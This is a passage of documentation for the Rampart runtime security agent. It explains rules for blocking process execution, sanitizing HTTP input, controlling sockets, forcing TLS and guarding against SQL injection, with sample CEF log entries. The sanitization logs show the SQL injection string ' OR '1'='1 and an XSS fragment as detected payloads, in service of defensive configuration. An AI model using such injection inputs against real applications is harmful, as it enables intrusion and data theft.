Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=/tmp/myscript.sh commandLine=/tmp/myscript.sh scriptArg
```

Windows
Windows:

```
<9>1 2021-03-29T11:52:52.1059+01:00 userX_system java 15844 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect executable in a specific directory|Execute Rule|Very-High|rt=Mar 29 2021 11:52:52.1059 +0100 dvchost=userX_system procid=15844 appVersion=1 ruleType=process securityFeature=process act=protect msg=denying attempt to execute processes inside specific directory stacktrace=com.example.spiracle.file.FileExecServlet.executeRequest(FileExecServlet.java:78)\ncom.example.spiracle.file.FileExecServlet.doPost(FileExecServlet.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=C:\\Windows\\myscript.bat commandLine=myscript.bat scriptArg
```

**Prevent forking a specific process**

Unix:

```
app("Process forking mod 2"):
  requires(version: Rampart/2.10)
  process("Prevent forking a specific process"):
    execute("/tmp/myscript.sh")
    protect(message: "denying attempt to execute specific process", severity: High)
  endprocess
endapp
```

Windows:

```
app("Process forking mod 2"):
  requires(version: Rampart/2.10)
  process("Prevent forking a specific process"):
    execute("C:\\Windows\\myscript.bat")
    protect(message: "denying attempt to execute specific process", severity: High)
  endprocess
endapp
```

**Detect forking any process with a specific name**

Unix:

```
app("Process forking mod 3"):
  requires(version: Rampart/2.10)
  process("Detect all attempts to execute myscript.sh"):
    execute("myscript.sh")
    detect(message: "myscript.sh file executed", severity: Low)
  endprocess
endapp
```

Windows:

```
app("Process forking mod 3"):
  requires(version: Rampart/2.10)
  process("Detect all attempts to execute myscript.bat"):
    execute("myscript.bat")
    detect(message: "myscript.bat file executed", severity: Low)
  endprocess
endapp
```

**Prevent forking all processes, except allow specific process**

Unix:

```
app("Process forking mod 4"):
  requires(version: Rampart/2.10)

  process("Prevent all process forking"):
    execute("*")
    protect(message: "denying attempt to execute any external process", severity: 7)
  endprocess

  process("Allow forking of specific process"):
    execute("/tmp/myscript.sh")
    allow(message: "allowing specific exectuable", severity: 3)
  endprocess

endapp
```

Windows:

```
app("Process forking mod 4"):
  requires(version: Rampart/2.10)

  process("Prevent all process forking"):
    execute("*")
    protect(message: "denying attempt to execute any external process", severity: 7)
  endprocess

  process("Allow forking of specific process"):
    execute("C:\\Windows\\myscript.bat")
    allow(message: "allowing specific exectuable", severity: 3)
  endprocess

endapp
```

# **Rampart Sanitization Rule**

## Overview

The Rampart Sanitization rule can be used to verify data entering the workflow of a server via an HTTP request. Such data is referred to here as a payload, and may be in the form of a String, JSON, or XML. Each payload is then matched against known safe and unsafe patterns. The unsafe patterns include common Cross-Site-Scripting, SQL Injection, and Path Traversal attacks. Any payload that matches an unsafe pattern is marked for sanitization, which means that a payload has been found to be potentially malicious and an action needs to be taken. If the rule action is configured in protect mode, the payload is prevented from being used by the system and a CEF event is generated. Configuring the rule in detect mode generates a CEF event and allows the workflow to continue uninterrupted. It is also possible that a payload may not cleanly match with any of the safe or unsafe patterns. Such payloads are labeled as undetermined values. For such cases, the rule can be configured to automatically mark all undetermined values as being safe or unsafe. Safe undetermined values are logged, where unsafe undetermined values are handled by the action.

## Given (Condition)

| Directive | Attribute | Necessity | Description |
| --------- | --------- | --------- | ----------- |
| request | paths | mandatory | This determines the HTTP endpoints for which protection is enabled. An optional Key-Value pair can be supplied to this declaration where the key is ‘paths’ and the value can be one of the following: (indicating specifically targeted HTTP endpoints)
• a quoted string
• a list of one or more quoted-strings
• the wildcard character (*) is supported to cover multiple URIs. This can be specified as:
	◦ a prefix ‘*/target.jsp’
	◦ a suffix ‘/myApplication/*‘
	◦ both a prefix and a suffix ‘*/target*‘
• if the wildcard character is one of the characters in the path itself, it has to be escaped using the backslash character ‘\*’
If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI
The ‘paths’ can be configured similar to:
• ‘request(paths: ["/api/user", "/api/cart"])’ |
| undetermined | values | mandatory | If a payload cannot be cleanly identified as being ‘safe’ or ‘unsafe’ then the rule considers these values as being undetermined. If undetermined values are configured as unsafe, then it is handled by the action. If ‘values’ are considered safe, they are logged for visibility but the action does not take effect. The ‘values’ can be configured only as:
• ‘undetermined(values: safe)’
• ‘undetermined(values: unsafe)’
Undetermined values are treated as ‘safe’ by default. An undetermined value is likely of interest to security engineers. Once satisfied that an application is able to safely handle undetermined values, there is a rule syntax to stop the generation of security events in this case:
• ‘undetermined(values: safe, logging: off)’ |
| ignore | payload | optional | The rule is used to verify data entering the workflow of a server against known safe and unsafe patterns. Such data is referred to here as a payload and may be in the form of a String, JSON, or XML. If the rule has marked a payload as being unsafe, but it has been reasoned that the payload is actually safe to use, then this configuration can be used to ignore those payloads. An array of payload values can be specified. The ‘payload’ can be configured similar to:
• ‘ignore(payload: ["abcd", "efgh", "1234"])’
The ‘payload’ can be configured along with the ‘attribute’ in the same ‘ignore’ declaration:
• ‘ignore(payload: ["abcd", "efgh", "1234"], attribute: ["field1", "keyname2"])’ |
| ignore | attribute | optional | If the Rampart Sanitization has marked a payload as being unsafe, but it has been reasoned that the assignment of that value (or indeed any value) within the codebase won’t be used in a malicious way, then this configuration allows the assignment to happen for the attribute. An attribute could be a class field, a map value, or a URL query parameter. An array of attribute names can be specified. The ‘attribute’ can be configured similar to:
• ‘ignore(attribute: ["field1", "keyname2"])’
The ‘attribute’ can be configured along with the ‘payload’ in the same ‘ignore’ declaration:
• ‘ignore(attribute: ["field1", "keyname2"], payload: ["abcd",  "efgh", "1234"])’ |


## When (Event)

The rule actively examines payloads coming from HTTP requests that use the `javax.servlet.ServletRequest` API and JSON/XML parsing within Spring Boot applications.

**API**

- ‘javax.servlet.ServletRequest.getParameter(Ljava/lang/String;)Ljava/lang/String;’
- ‘javax.servlet.ServletRequest.getParameterMap()Ljava/util/Map;’
- ‘javax.servlet.ServletRequest.getParameterValues()[Ljava/lang/String;’
- ‘javax.servlet.ServletInputStream.readLine([BII)I’
- Spring Boot - JSON to Object Conversion
- Spring Boot - XML to Object Conversion

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Payloads that are marked for sanitization are blocked by either throwing an exception or replacing the malicious value with a null reference. Doing so prevents the HTTP request from being processed. If logging is configured, a CEF entry is added to the log file with details of the event. This information includes the payload that was marked for sanitization, the HTTP endpoint, the affected class, and the attribute associated with the payload and class. |
| detect | Monitoring mode: the application behaves as normal. A CEF entry is added to the log file with details of the event. This information includes the payload that was marked for sanitization, the HTTP endpoint, the affected class, and the attribute associated with the payload and class. A log message must be specified with this action. |

## Examples

### Basic Single Rule Configuration

The following example shows the basic configuration for a single Rampart Sanitization rule. This rule:

- enables sanitization in `protect` mode for any HTTP request. Any `unsafe` payload caught by the sanitization rule in `protect` mode generates a CEF log entry, and is blocked from being consumed by the application.
- considers any `undetermined` value to be `safe`. All safe undetermined values generate a CEF log entry, but are not handled by the action.
- logs a `high` severity CEF entry with a custom message of “A payload has been marked for sanitization“.

```
app("SECURITY POLICY"):
    requires(version: Rampart/2.10)

    sanitization("SANITIZATION :01"):
        request()
        undetermined(values: safe)
        protect(message: "A payload has been marked for sanitization", severity: high)
    endsanitization

endapp
```

### Advanced Multiple Rule Configuration

The following example shows a more detailed configuration with multiple Rampart Sanitization rules.

The first rule:

- enables sanitization in `detect` mode for any HTTP request that is not mapped by the rule named `SANITIZATION :02`. Any `unsafe` payload caught by the sanitization rule in `detect` mode generates a CEF log entry. It is recommended to review and report any suspicious entries in the CEF log as further sanitization rules can be configured based on this data.
- considers any `undetermined` values to be `unsafe`. All unsafe values are handled by the action; in this case `detect`.
- logs a `medium` severity CEF entry using the default message.

The second rule:

- enables sanitization in `protect` mode, but only for the URIs `"/api/user/regiester", "/api/shop/basket/add"`. Any unsafe payload caught by the sanitization rule in `protect` mode generates a CEF log entry and is blocked from being consumed by the application.
- considers any `undetermined` value as `unsafe`. All unsafe values are handled by the action; in this case `protect`.
- ignores the `payload: ["1=1=1 Air Force 1=1=1"]` because this is the actual name of a product being sold by the online store that could be added to the basket. In the case of our example, a review of this value found that it could be safely ignored. The result of not ignoring this particular payload would have resulted in the Rampart Sanitization rule blocking it due to the detection of SQL Injection.
- ignores the `attribute: ["time"]` because this is a field of a class that is assigned a value coming from an HTTP request. After reviewing the business logic of how this field is being used in the application, it was decided that values assigned to this field cannot be used in a malicious way, making it safe to ignore. This avoids the Rampart Sanitization rule protecting against values that are of no concern.
- log a high severity CEF entry with a custom message of “sensitive API endpoint under attack”.

```
app("SECURITY POLICY"):
    requires(version: Rampart/2.10)

    sanitization("SANITIZATION :01"):
        request()
        undetermined(values: unsafe)
        detect(message: "", severity: medium)
    endsanitization

    sanitization("SANITIZATION :02"):
        request(paths: ["/api/user/regiester",
                        "/api/shop/basket/add"])
        undetermined(values: unsafe)
        ignore(payload: ["1=1=1 Air Force 1=1=1"],
               attribute: ["time"])
        protect(message: "sensitive API endpoint under attack", severity: high)
    endsanitization

endapp
```

## Logging

A log entry similar to the following is generated when an unsafe payload for protect and detect is caught by the sanitization rule and when a safe undetermined value is caught.

### Protect Mode

```
<10>1 2021-02-19T20:06:56.939Z localhost java 19559 - - CEF:0|Rampart:Rampart|Rampart|2.10|SANITIZATION :01|Execute Rule|High|rt=Feb 19 2021 20:06:56.939 +0000 dvchost=localhost procid=19559 appVersion=1 ruleType=sanitization securityFeature=sanitization datainput act=protect msg=A payload has been classified as malicious reason=SQLI taintSource=HTTP_SERVLET httpRequestUri=/api/forum/print/requestbody/as/map httpRequestMethod=GET internalHttpRequestUri=/api/forum/print/requestbody/as/map className=java.util.LinkedHashMap attribute=MAP_KEY["message"] payload=' OR '1'\='1 remoteIpAddress=127.0.0.1 localIpAddress=127.0.0.1 localPort=8080
```

### Detect Mode

```
<10>1 2021-02-19T20:15:25.002Z localhost java 19559 - - CEF:0|Rampart:Rampart|Rampart|2.10|SANITIZATION :01|Execute Rule|High|rt=Feb 19 2021 20:15:25.002 +0000 dvchost=localhost procid=19559 appVersion=1 ruleType=sanitization securityFeature=sanitization datainput act=detect msg=A payload has been classified as malicious reason=XSS taintSource=HTTP_SERVLET httpRequestUri=/api/forum/print/xml/requestbody/complex httpRequestMethod=GET internalHttpRequestUri=/api/forum/print/xml/requestbody/complex className=com.example.data.entity.xml.ForumEntityXml attribute=OBJECT_FIELD["message"] payload=<script> remoteIpAddress=127.0.0.1 localIpAddress=127.0.0.1 localPort=8080
```

### Safe Undetermined

```
<10>1 2021-02-19T20:09:43.593Z localhost java 19559 - - CEF:0|Rampart:Rampart|Rampart|2.10|SANITIZATION :01|Execute Rule|High|rt=Feb 19 2021 20:09:43.592 +0000 dvchost=localhost procid=19559 appVersion=1 ruleType=sanitization securityFeature=sanitization datainput msg=A payload could not be classified reason=UNDETERMINED taintSource=HTTP_SERVLET httpRequestUri=/api/forum/add/json httpRequestMethod=GET internalHttpRequestUri=/api/forum/add/json className=com.example.data.entity.ForumEntity attribute=OBJECT_FIELD["message"] payload=< > remoteIpAddress=127.0.0.1 localIpAddress=127.0.0.1 localPort=8080
```

# **Rampart Socket Rule**

## **Socket Control Security Feature**

ℹ️ Please see the **API Protect Directives** section of this document for information on how to configure this rule for API endpoint protection.

## Overview

The socket rule begins with a `socket` and ends with an `endsocket`. It must contain the rule name as a parameter and this is an arbitrary string, hence it needs to be surrounded with double-quotes. The `socket` rule cannot contain duplicate statements, and multiple `socket` rules are allowed in the same Rampart application. The order of statements inside the `socket` rule does not matter.

## Given (Condition)

| bind | The bind takes the following key-value pairs as parameters: ‘client’ and ‘server’. They can be used simultaneously within ‘bind’. The value for both ‘client’ and ‘server’ keys within ‘bind’ is a quoted-string composed of the IP address of the local interface and the port, separated by a colon. Wildcard for IPv4 addresses is specified by ‘0.0.0.0’, and wildcard for port is specified by ‘0’. The following are examples of ‘bind’ conditions, specifying wildcarded IPv4 addresses and wildcarded port:
```
bind(client: "0.0.0.0:0")
bind(server: "0.0.0.0:0")
bind(server: "0.0.0.0:0", client: "0.0.0.0:0")
```
Specific IPv4 and/or port numbers may be specified, for example:
```
bind(client: "127.0.0.1:80")
bind(server: "127.0.0.1:0")
bind(client: "0.0.0.0:80")
```
Port ranges may be specified, for example:
```
bind(client: "0.0.0.0:80-90")
bind(server: "0.0.0.0:8080-8090")
bind(server: "127.0.0.1:8080-8090") |
| accept and connect | ‘accept’ and ‘connect’ require only a single parameter which is the IPv4 address and port for accepting connections from and to a remote address, respectively. Hostnames may also be used. Wildcard for IPv4 addresses is specified by ‘0.0.0.0’, and wildcard for port is specified by ‘0’. The following are examples of ‘accept’ and ‘connect’ conditions specifying wildcarded IPv4 addresses and wildcarded port:
```
accept("0.0.0.0:0")
accept("localhost:0")
connect("0.0.0.0:0")
connect("localhost:0")
```
Specific IPv4 and/or port numbers may be specified; hostnames may also be specified. For example:
```
accept("127.0.0.1:5001")
accept("0.0.0.0:5001")
connect("127.0.0.1:8080")
connect("127.0.0.1:0")
```
Port ranges may be specified, for example:
```
accept("127.0.0.1:5000-5100")
connect("0.0.0.0:8080-8100")
``` |

It is possible to create multiple Rampart socket rules with overlapping or overarching conditions. The agent handles this configuration by selecting only a single rule and applies the action defined in it. The agent uses the following criteria for selection:

1. select the rule that contains a matching IP address and port, using a rule containing wildcards if no match is found
2. if more than one such matching rule exists then priority is given based on the action, in the order allow, protect, detect

ℹ️ To avoid unexpected behavior, it is recommended to limit the number of rules that overlap when possible.

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Block network connections to or from an IP address and port combination specified in the 'socket' rule. If configured, a log message is generated with details of the event. |
| allow | Allow network connections to or from an IP address and port combination specified in the 'socket' rule. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. Network connections to or from an IP address and port combination specified in the 'socket' rule are logged only. A log message must be specified with this action. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: "full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

Blocking client binds on all interfaces and all ports:

```
app("Socket Client Bind Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking client binds on all interfaces and all ports"):
        bind(client: "0.0.0.0:0")
        protect(message: "port binding blocked", severity: 8)
    endsocket
endapp
```

Blocking server binds on all interfaces and all ports:

```
app("Socket Server Bind Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking server binds on all interfaces and all ports"):
        bind(server: "0.0.0.0:0")
        protect(message: "port binding blocked", severity: 8)
    endsocket
endapp
```

Blocking client connections on all ports:

```
app("Socket Connect Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking client connections on all ports"):
        connect("0.0.0.0:0")
        protect(message: "connections blocked", severity: 8)
    endsocket
endapp
```

Blocking server accepting connections on all interfaces and all ports:

```
app("Socket Accept Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking server accepting connections on all interfaces and all ports"):
        accept("0.0.0.0:0")
        protect(message: "connections blocked", severity: 8)
    endsocket
endapp
```

Blocking server accepting connections on a specific interface and specific port:

```
app("Socket Accept Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking server accepting connections on IP 127.0.0.1 and specific port 5001"):
        accept("127.0.0.1:5001")
        protect(message: "connections blocked", severity: 8)
    endsocket
endapp
```

Blocking server accepting connections on a specific interface, over a range of ports:

```
app("Socket Accept Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking server accepting connections on IP 127.0.0.1 and port range 5000-5010"):
        accept("127.0.0.1:5000-5010")
        protect(message: "connections blocked", severity: 8)
    endsocket
endapp
```

Blocking client binds on all interfaces and all ports, but allowing them on a specific interface and specific port:

```
app("Socket Client Bind Mod Multiple Rules"):
    requires(version: Rampart/2.10)

    socket("Socket bind protect all"):
        bind(client: "0.0.0.0:0")
        protect(message: "Socket rule protect 0.0.0.0:0", severity: High)
    endsocket

    socket("Socket bind allow specific"):
        bind(client: "127.0.0.1:5000")
        allow(message: "Socket rule allow 127.0.0.1:5000", severity: Medium)
    endsocket

endapp
```

### Logging

A log entry similar to the following is generated by events resulting from the Socket Client Bind, the Socket Connect rule, and the Socket Accept rules below, respectively:

```
<10>1 2021-03-22T11:03:42.1020Z userX_system java 5989 - - CEF:0|Rampart:Rampart|Rampart|2.10|Socket rule protect|Execute Rule|High|rt=Mar 22 2021 11:03:42.1019 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=5989 appVersion=1 ruleType=socket securityFeature=socket bind act=protect msg=Socket rule protect 127.0.0.1:0 localIpAddress=127.0.0.1 localPort=5001
```

```
<10>1 2021-03-22T11:05:20.332Z userX_system java 6442 - - CEF:0|Rampart:Rampart|Rampart|2.10|Socket rule protect|Execute Rule|High|rt=Mar 22 2021 11:05:20.331 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=6442 appVersion=1 ruleType=socket securityFeature=socket connect act=protect msg=Socket rule protect 0.0.0.0:80 remoteIpAddress=74.125.193.105 remotePort=80
```

```
<10>1 2021-03-22T11:06:00.934Z userX_system java 6591 - - CEF:0|Rampart:Rampart|Rampart|2.10|Socket rule protect|Execute Rule|High|rt=Mar 22 2021 11:06:00.932 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=6591 appVersion=1 ruleType=socket securityFeature=socket accept act=protect msg=Socket rule protect 127.0.0.1:0 remoteIpAddress=127.0.0.1 remotePort=5001
```

## Further Examples

Blocking server binds on all interfaces and all ports with `stacktrace: "full"` parameter:

```
app("Socket Server Bind Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking server binds on all interfaces and all ports"):
        bind(server: "0.0.0.0:0")
        protect(message: "port binding blocked", severity: 8, stacktrace: "full")
    endsocket
endapp
```

### Logging

```
<10>1 2021-04-01T13:48:30.121+01:00 userX_system java 23223 - - CEF:0|Rampart:Rampart|Rampart|2.10|Blocking server binds on all interfaces and all ports|Execute Rule|High|rt=Apr 01 2021 13:48:30.119 +0100 dvchost=hostnameX procid=23223 appVersion=1 ruleType=socket securityFeature=socket serverbind act=protect msg=port binding blocked stacktrace=java.net.ServerSocket.bind(ServerSocket.java)\nNetworkServerSocket.main(NetworkServerSocket.java:19) localIpAddress=127.0.0.1 localPort=5001
```

Blocking client connections on all ports with `stacktrace: "full"` parameter:

```
app("Socket Connect Mod"):
    requires(version: Rampart/2.10)
    socket("Blocking client connections on all ports"):
        connect("0.0.0.0:0")
        protect(message: "connections blocked", severity: 8, stacktrace: "full")
    endsocket
endapp
```

### Logging

```
<10>1 2021-04-01T13:58:10.562+01:00 userX_system java 23895 - - CEF:0|Rampart:Rampart|Rampart|2.10|Blocking client connections on all ports|Execute Rule|High|rt=Apr 01 2021 13:58:10.561 +0100 dvchost=hostnameX procid=23895 appVersion=1 ruleType=socket securityFeature=socket connect act=protect msg=connections blocked stacktrace=java.net.Socket.connect(Socket.java)\nClientConnection.attemptServerConnection(ClientConnection.java:37)\nClientConnection.main(ClientConnection.java:24) remoteIpAddress=127.0.0.1 remotePort=5001
```

Blocking client connections on all ports with `“localhost“` parameter:

```
app("Socket Connect Mod"):
    requires(version: Rampart/2.10)
    socket("connect to localhost"):
        connect("localhost:0")
        protect(message: "coonections blocked", severity: High)
    endsocket
endapp
```

### Logging

```
<10>1 2021-04-01T13:58:10.562+01:00 userX_system java 23895 - - CEF:0|Rampart:Rampart|Rampart|2.10|Blocking client connections on all ports|Execute Rule|High|rt=Apr 01 2021 13:58:10.561 +0100 dvchost=hostnameX procid=23895 appVersion=1 ruleType=socket securityFeature=socket connect act=protect msg=connections blocked stacktrace=java.net.Socket.connect(Socket.java)\nClientConnection.attemptServerConnection(ClientConnection.java:37)\nClientConnection.main(ClientConnection.java:24) remoteIpAddress=127.0.0.1 remotePort=5001
```

Blocking server accepting connections with `“localhost“` parameter:

```
app("Socket Accept Mod"):
    requires(version: Rampart/2.10)
    socket("blocking server accepting connections"):
        accept("localhost:0")
        protect(message: "connections blocked", severity: 8)
    endsocket
endapp
```

### Logging

```
<10>1 2021-03-22T11:06:00.934Z userX_system java 6591 - - CEF:0|Rampart:Rampart|Rampart|2.10|Socket rule protect|Execute Rule|High|rt=Mar 22 2021 11:06:00.932 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=6591 appVersion=1 ruleType=socket securityFeature=socket accept act=protect msg=Socket rule protect 127.0.0.1:0 remoteIpAddress=127.0.0.1 remotePort=5001
```

## **Secure Sockets**

### Overview

Creating plain TCP server sockets without data encryption allows attackers to intercept such communication channels and read/modify the transmitted data. To avoid such attacks, the communication channel must be encrypted. To enforce this policy, the rule upgrades TCP server sockets to SSL/TLS server sockets. Upgrading TCP server sockets to SSL/TLS server sockets significantly increases the difficulty of executing man-in-the-middle attacks and addresses known vulnerabilities such as CWE-319, CWE-311, and CWE-5 which are classified as "Sensitive Data Exposure" in OWASP’s Top 10 list.

The upgrade is completely transparent to the application and behaves as if communication is occurring over an unencrypted channel. Additionally, because of the fact that the host could be a newer Java version than the guest, SSL/TLS server sockets are able to utilize the newer cipher suites available to the host JVM. This provides the advantage of stronger encryption via the use of the latest cryptographic algorithms for SSL/TLS communication.

In order for this rule to successfully upgrade TCP server sockets to SSL/TLS server sockets, make sure that the following system properties are set, according to the desired SSL/TLS configuration. Note that the same system properties must be set on both the server and the client nodes.

```
- Djavax.net.ssl.trustStore
- Djavax.net.ssl.trustStorePassword
- Djavax.net.ssl.keyStore
- Djavax.net.ssl.keyStorePassword
```

## When (Event)

| accept | IP address and port: When a specific 'protect' action acting on connections is enforced (e.g. forcing TCP connections to use TLS for connection by specifying 'connection: secure' key-value), only wildcard IP and port are supported |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Upgrades TCP server sockets to SSL/TLS server sockets. If configured, a log message is generated with details of the event. The `stacktrace: "full"` action parameter is not a valid configuration for the Secure Sockets rule. If configured, a log message is generated with details of the event. |

## Examples

Force TCP connections to use TLS for connections:

```
app("Socket Accept Forced TLS"):
    requires(version: Rampart/2.10)
    socket("Force TCP connections to use TLS for connections"):
        accept("0.0.0.0:0")
        protect(connection: secure, message: "forced TLS on every connection", severity: High)
    endsocket
endapp
```

### Logging

When the above `Secure Sockets` rule is triggered a log entry similar to the following is generated:

```
<10>1 2021-03-12T23:28:52.1027Z userX_system  java 27253 - - CEF:0|Rampart:Rampart|Rampart|2.10|Force TCP connections to use TLS for connections|Execute Rule|High|rt=Mar 12 2021 23:28:52.1027 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=27253 appVersion=1 ruleType=socket securityFeature=socket tcptossl act=protect msg=Forced TLS on every connection localName=0.0.0.0 localPort=33547
```

## **TLS upgrade**

### Overview

Java applications that run on legacy Java platforms (such as Java 6) that use SSL/TLS communications are vulnerable to numerous critical attacks. This is because legacy Java platforms do not implement or support the latest and more stable stack of TLS protocols and cipher suites. The TLS-Upgrade rule ensures that Java applications running on Java 6 take advantage of the latest TLS protocols and cipher suites without requiring any code modifications. By enabling this rule all SSL/TLS connections are upgraded to the latest version of TLS supported by the host JVM.

The TLS-Upgrade rule only upgrades SSL/TLS server sockets when using the default SSLContext. The upgrade of an SSL/TLS server socket is completely transparent to the application. This is achieved by replacing the old and untrusted cryptographic protocols (such as SSL) with the latest and trusted ones (such as TLSv1.2). Therefore, it provides protection for common vulnerabilities related to cryptography such as CWE-327 and CWE-326.

ℹ️ This rule is aimed at versions of Java 6 up to and including 6u21. The rule does not support versions of Java that are newer than 6u21. This rule only upgrades SSL/TLS server sockets. Sockets on the client-side are not upgraded.

ℹ️ In case there is a specific Java configuration required for SSL/TLS the host java.security file should be updated accordingly.

## When (Event)

| accept | IP address and port: When a specific `protect` action acting on connections is enforced (e.g. enforcing TLS upgrade by specifying ‘connection: upgrade-tls’ key-value), only wildcard IP and port are supported |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Upgrade SSL/TLS server sockets. If configured, a log message is generated with details of the event. The `stacktrace: "full"` action parameter is not a valid configuration for the TLS-Upgrade rule. If configured, a log message is generated with details of the event. |

## Examples

Upgrade TLS connections for connections:

```
app("myapp"):
    requires(version: Rampart/2.10)
    socket("Upgrade TLS connections for connections"):
        accept("0.0.0.0:0")
        protect(connection: upgrade-tls, message: "TLS connection upgraded", severity: High)
    endsocket
endapp
```

### Logging

When the above `TLS upgrade` rule is triggered a log entry similar to the following is generated:

```
<10>1 2020-09-14T13:56:40.095+01:00 userX_system java 18420 - - CEF:0|Rampart:Rampart|Rampart|2.10|Force TCP connections to use TLS for connections|Execute Rule|High|rt=Sep 14 2020 13:56:40.094 +0100 dvchost=ckang-XPS-15-9570 procid=18420 ruleType=socket securityFeature=socket tlsupgrade act=protect msg=Forced TLS on every connection dst=0 localPort=40071 localName=0.0.0.0
```

# **Rampart SQL Rule**

## Overview

A SQL injection (SQLi) attack consists of the insertion or “injection” of a SQL query via the input data from the client to the application. The Rampart `sql` rule can be used to enable protection against SQL injection attacks.

ℹ️ SQL Injection vulnerabilities are covered by CWE-89.

## Given (Conditions)

The user can specify two conditions in the Rampart `sql` rule - `input` and `vendor`.

| input | This allows the user to specify the source of the untrusted data. The following three sources are supported:
• `http` data introduced via HTTP/HTTPS requests
• `database` data introduced via JDBC connections
• `deserialization` data introduced via Java or XML deserialization
The rule triggers if the source of the untrusted data matches that specified in the rule. If no value is specified then a default value of `http` is used. An exception is thrown if an unsupported value is provided. |
| vendor | This is an optional declaration that allows the user to specify the database type to be protected. The following databases are supported:
• `db2`
• `mariadb`
• `mssql`
• `mysql`
• `oracle`
• `sybase`
• `postgres`
In addition, a value of `any` may be specified which enables the agent to automatically detect the database type used by the application. One of the listed database types, or the value `any`, must be specified if the `vendor` declaration is present. If no `vendor` declaration is specified then a default value of `any` is used. |
| vendor | options | Depending on the database configuration, the following optional parameters are also supported to allow the agent to accurately detect SQL injection attacks: • `ansi-quotes` - `mysql` and `mariadb`: corresponds to the ANSI_QUOTES server mode.
• `no-backslash-escapes` - `mysql` and `mariadb`: corresponds to the NO_BACKSLASH_ESCAPES server mode.
